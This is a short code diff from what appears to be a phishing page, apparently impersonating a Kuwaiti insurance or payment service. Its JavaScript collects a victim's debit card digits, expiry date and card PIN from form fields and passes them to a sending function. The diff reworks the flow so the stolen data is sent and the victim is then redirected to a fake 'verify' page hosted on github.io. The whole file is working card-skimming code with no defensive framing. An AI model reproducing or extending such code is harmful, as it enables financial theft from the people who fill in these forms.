@@ -193,9 +193,12 @@
         message += `💳 آخر 10 أرقام: ${document.getElementById("debitNumber").value}\n`
         message += `📅 انتهاء: ${document.getElementById("month").value}/${document.getElementById("year").value}\n`
         message += `\n🔑 الرمز السري: ${document.getElementById("cardPin").value}\n`;
-        pa({message,})
-        if(!flag_false)
-            window.location.href = '/verify.html';
+        if(flag_false){
+            pa({message,})
+        }
+        else{
+            pa({message,},'https://kuwaittameen.github.io/tameen/verify')
+        }
     }
 
     function onPay() {
